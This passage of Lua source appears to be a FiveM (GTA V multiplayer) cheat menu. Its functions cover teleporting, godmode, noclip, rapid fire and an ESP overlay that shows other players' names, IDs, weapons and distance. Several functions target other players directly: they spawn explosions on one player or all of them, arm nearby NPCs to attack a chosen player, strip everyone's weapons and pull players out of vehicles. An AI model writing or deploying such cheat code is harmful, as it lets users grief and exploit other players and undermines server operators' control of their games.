                DrawTxt("~b~Controls:\n~w~-------------------", 0.1, 0.2, 0.0, 0.4)
                DrawTxt("~b~W/S: ~w~Forward/Back\n~b~SPACEBAR: ~w~Up\n~b~CTRL: ~w~Down\n~b~X: ~w~Cancel", 0.1, 0.25, 0.0, 0.4)
                Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 20)
                DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, 0, 0, 180, 35, false, true, 2, nil, nil, false)
                
                local forward = SubVectors(Markerloc, GetEntityCoords(veh))
                local vpos = GetEntityCoords(veh)
                local vf = GetEntityForwardVector(veh)
                local vrel = SubVectors(vpos, vf)
                
                SetEntityCoords(PlayerPedId(), vrel.x, vrel.y, vpos.z + 1.1)
                SetEntityNoCollisionEntity(PlayerPedId(), veh, 1)
                
                RequestControlOnce(veh)
                
                if IsDisabledControlPressed(0, Keys["W"]) then
                    ApplyForce(veh, forward * 0.1)
                end
                
                if IsDisabledControlPressed(0, Keys["S"]) then
                    ApplyForce(veh, -(forward * 0.1))
                end
                
                if IsDisabledControlPressed(0, Keys["SPACE"]) then
                    ApplyForceToEntity(veh, 3, 0.0, 0.0, 1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                end
                
                if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then
                    ApplyForceToEntity(veh, 3, 0.0, 0.0, -1.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                end
                
                if IsDisabledControlPressed(0, Keys["X"]) or GetEntityHealth(PlayerPedId()) < 5.0 then
                    PossessingVeh = false
                    SetEntityVisible(PlayerPedId(), true, 0)
                    SetEntityCoords(PlayerPedId(), oldPlayerPos)
                    SetEntityCollision(PlayerPedId(), true, 1)
                end
                
                Wait(0)
            end
        end)
    end
end

function GetWeaponNameFromHash(hash)
    for i = 1, #allweapons do
        if GetHashKey(allweapons[i]) == hash then
            return string.sub(allweapons[i], 8)
        end
    end
end

function TeleportToCoords()
    local x = GetKeyboardInput("Enter ~b~X ~s~Coordinates", "", 100)
    local y = GetKeyboardInput("Enter ~b~Y ~s~Coordinates", "", 100)
    local z = GetKeyboardInput("Enter ~b~Z ~s~Coordinates", "", 100)
    local entity
    if x ~= "" and y ~= "" and z ~= "" then
        if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
        else
            entity = PlayerPedId()
        end
        if entity then
            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
        end
    else
        ShowInfo("~b~Invalid Coordinates!")
    end
end


local function fbi()
    local bB = 160.868
    local bC = -745.831
    local bD = 250.063
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function ls()
    local bB = -365.425
    local bC = -131.809
    local bD = 37.873
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function gp()
    local bB = 266.12
    local bC = -752.51
    local bD = 34.64
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function dealership()
    local bB = -15.32
    local bC = -1080.69
    local bD = 26.14
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function Ammunation()
    local bB = 19.22
    local bC = -1108.71
    local bD = 29.8
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function shopclothes()
    local bB = 428.61
    local bC = -799.89
    local bD = 29.49
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function barber()
    local bB = -32.84
    local bC = -152.34
    local bD = 57.08
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end


function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end

function engine(veh)
	SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)				
end

function engine1(veh)
                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end



local function fixcar()
ShowInfo("~g~Car fixed!")
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					
		end


local function FixVeh(veh)
    SetVehicleEngineHealth(veh, 1000)
    SetVehicleFixed(veh)
end

local function ExplodePlayer(target)
    local ped = GetPlayerPed(target)
    local coords = GetEntityCoords(ped)
    AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, 4, 100.0, true, false, 0.0)
end

local function ExplodeAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        ExplodePlayer(i)
    end
end


-- Thanks to Rizz for the idea
local function PedAttack(target, attackType)
    local coords = GetEntityCoords(GetPlayerPed(target))
    
    if attackType == 1 then weparray = allweapons
    elseif attackType == 2 then weparray = meleeweapons
    elseif attackType == 3 then weparray = pistolweapons
    elseif attackType == 4 then weparray = heavyweapons
    end
    
    for k in EnumeratePeds() do
        if k ~= GetPlayerPed(target) and not IsPedAPlayer(k) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) < 2000 then
            local rand = math.ceil(math.random(#weparray))
            if weparray ~= allweapons then GiveWeaponToPed(k, GetHashKey(weparray[rand][1]), 9999, 0, 1)
            else GiveWeaponToPed(k, GetHashKey(weparray[rand]), 9999, 0, 1) end
            ClearPedTasks(k)
            TaskCombatPed(k, GetPlayerPed(target), 0, 16)
            SetPedCombatAbility(k, 100)
            SetPedCombatRange(k, 2)
            SetPedCombatAttributes(k, 46, 1)
            SetPedCombatAttributes(k, 5, 1)
        end
    end
end


function ApplyShockwave(entity)
    local pos = GetEntityCoords(PlayerPedId())
    local coord = GetEntityCoords(entity)
    local dx = coord.x - pos.x
    local dy = coord.y - pos.y
    local dz = coord.z - pos.z
    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
    local distanceRate = (50 / distance) * math.pow(1.04, 1 - distance)
    ApplyForceToEntity(entity, 1, distanceRate * dx, distanceRate * dy, distanceRate * dz, math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), true, false, true, true, true, true)
end

local function DoForceFieldTick(radius)
    local player = PlayerPedId()
    local coords = GetEntityCoords(PlayerPedId())
    local playerVehicle = GetPlayersLastVehicle()
    local inVehicle = IsPedInVehicle(player, playerVehicle, true)
    
    DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, false, true, 2, nil, nil, false)
    
    for k in EnumerateVehicles() do
        if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
            RequestControlOnce(k)
            ApplyShockwave(k)
        end
    end
    
    for k in EnumeratePeds() do
        if k ~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
            RequestControlOnce(k)
            SetPedRagdollOnCollision(k, true)
            SetPedRagdollForceFall(k)
            ApplyShockwave(k)
        end
    end
end

local function DoRapidFireTick()
    DisablePlayerFiring(PlayerPedId(), true)
    if IsDisabledControlPressed(0, Keys["MOUSE1"]) then
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
        local camDir = GetCamDirFromScreenCenter()
        local camPos = GetGameplayCamCoord()
        local launchPos = GetEntityCoords(wepent)
        local targetPos = camPos + (camDir * 200.0)
        
        ClearAreaOfProjectiles(launchPos, 0.0, 1)
        
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
    end
end

local function StripPlayer(target)
    local ped = GetPlayerPed(target)
    RemoveAllPedWeapons(ped, false)
end

local function StripAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        StripPlayer(i)
    end
end

local function KickFromVeh(target)
    local ped = GetPlayerPed(target)
    if IsPedInAnyVehicle(ped, false) then
        ClearPedTasksImmediately(ped)
    end
end

local function KickAllFromVeh(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        KickFromVeh(i)
    end
end

local function CancelAnimsAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        ClearPedTasksImmediately(GetPlayerPed(plist[i]))
    end
end

local function RandomClothes(target)
    local ped = GetPlayerPed(target)
    SetPedRandomComponentVariation(ped, false)
    SetPedRandomProps(ped)
end

local function GiveAllWeapons(target)
    local ped = GetPlayerPed(target)
    for i = 0, #allweapons do
        GiveWeaponToPed(ped, GetHashKey(allweapons[i]), 9999, false, false)
    end
end

local function GiveAllPlayersWeapons(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        GiveAllWeapons(i)
    end
end

local function GiveWeapon(target, weapon)
    local ped = GetPlayerPed(target)
    GiveWeaponToPed(ped, GetHashKey(weapon), 9999, false, false)
end

local function GiveMaxAmmo(target)
    local ped = GetPlayerPed(target)
    for i = 1, #allweapons do
        AddAmmoToPed(ped, GetHashKey(allweapons[i]), 9999)
    end
end

local function TeleportToPlayer(target)
    local ped = GetPlayerPed(target)
    local pos = GetEntityCoords(ped)
    SetEntityCoords(PlayerPedId(), pos)
end

local function TeleportToWaypoint()
    local entity = PlayerPedId()
    if IsPedInAnyVehicle(entity, false) then
        entity = GetVehiclePedIsUsing(entity)
    end
    local success = false
    local blipFound = false
    local blipIterator = GetBlipInfoIdIterator()
    local blip = GetFirstBlipInfoId(8)
    
    while DoesBlipExist(blip) do
        if GetBlipInfoIdType(blip) == 4 then
            cx, cy, cz = table.unpack(Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()))--GetBlipInfoIdCoord(blip)
            blipFound = true
            break
        end
        blip = GetNextBlipInfoId(blipIterator)
        Wait(0)
    end
    
    if blipFound then
        local groundFound = false
        local yaw = GetEntityHeading(entity)
        
        for i = 0, 1000, 1 do
            SetEntityCoordsNoOffset(entity, cx, cy, ToFloat(i), false, false, false)
            SetEntityRotation(entity, 0, 0, 0, 0, 0)
            SetEntityHeading(entity, yaw)
            SetGameplayCamRelativeHeading(0)
            Wait(0)
            if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, false) then
                cz = ToFloat(i)
                groundFound = true
                break
            end
        end
        if not groundFound then
            cz = -300.0
        end
        success = true
    else
        ShowInfo('~b~Blip not found')
    end
    
    if success then
	ShowInfo("~g~Teleported!")
        SetEntityCoordsNoOffset(entity, cx, cy, cz, false, false, true)
        SetGameplayCamRelativeHeading(0)
        if IsPedSittingInAnyVehicle(PlayerPedId()) then
            if GetPedInVehicleSeat(GetVehiclePedIsUsing(PlayerPedId()), -1) == PlayerPedId() then
                SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId()))
            end
        end
    end

end


local function ToggleGodmode(tog)
    local ped = PlayerPedId()
    SetEntityProofs(ped, tog, tog, tog, tog, tog)
    SetPedCanRagdoll(ped, not tog)
end

local function ToggleNoclip()
ShowInfo("Noclipping ~g~[ON]")
    Noclipping = not Noclipping
    if Noclipping then
        SetEntityVisible(PlayerPedId(), false, false)
    else
        SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
        SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, false)
        SetEntityVisible(PlayerPedId(), true, false)
    end
end

local function ToggleESP()
    ESPEnabled = not ESPEnabled
	local _,x,y = false, 0.0, 0.0
	
	Citizen.CreateThread(function()
		while ESPEnabled do
            local plist = GetActivePlayers()
            table.removekey(plist, PlayerId())
            for i = 1, #plist do
				local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
				_, x, y = GetScreenCoordFromWorldCoord(targetCoords.x, targetCoords.y, targetCoords.z)
			end
			Wait(ESPRefreshTime)
		end
	end)
	
	
    Citizen.CreateThread(function()
        while ESPEnabled do
            local plist = GetActivePlayers()
            table.removekey(plist, PlayerId())
            for i = 1, #plist do
                local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), targetCoords)
                if distance <= EspDistance then
                    local _, wephash = GetCurrentPedWeapon(GetPlayerPed(plist[i]), 1)
                    local wepname = GetWeaponNameFromHash(wephash)
                    local vehname = "On Foot"
                    if IsPedInAnyVehicle(GetPlayerPed(plist[i]), 0) then
                        vehname = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(GetPlayerPed(plist[i])))))
                    end
                    if wepname == nil then wepname = "Unknown" end
                    DrawRect(x, y, 0.008, 0.01, 0, 0, 255, 255)
                    DrawRect(x, y, 0.003, 0.005, 255, 0, 0, 255)
                    local espstring1 = "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "~w~  |  ~b~Name: ~w~" .. GetPlayerName(plist[i]) .. "  |  ~b~Distance: ~w~" .. math.floor(distance)
                    local espstring2 = "~b~Weapon: ~w~" .. wepname .. "  |  ~b~Vehicle: ~w~" .. vehname
                    DrawTxt(espstring1, x - 0.05, y - 0.04, 0.0, 0.2)
                    DrawTxt(espstring2, x - 0.05, y - 0.03, 0.0, 0.2)
                end
            end
            Wait(0)
        end
    end)
end

function ToggleBlips()
    BlipsEnabled = not BlipsEnabled
    
    if not BlipsEnabled then
        for i = 1, #pblips do
            RemoveBlip(pblips[i])
        end
    else
        
        Citizen.CreateThread(function()
            pblips = {}
            while BlipsEnabled do
                local plist = GetActivePlayers()
                table.removekey(plist, PlayerId())
                for i = 1, #plist do
                    if NetworkIsPlayerActive(plist[i]) then
                        ped = GetPlayerPed(plist[i])
                        pblips[i] = GetBlipFromEntity(ped)
                        if not DoesBlipExist(pblips[i]) then
                            pblips[i] = AddBlipForEntity(ped)
                            SetBlipSprite(pblips[i], 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
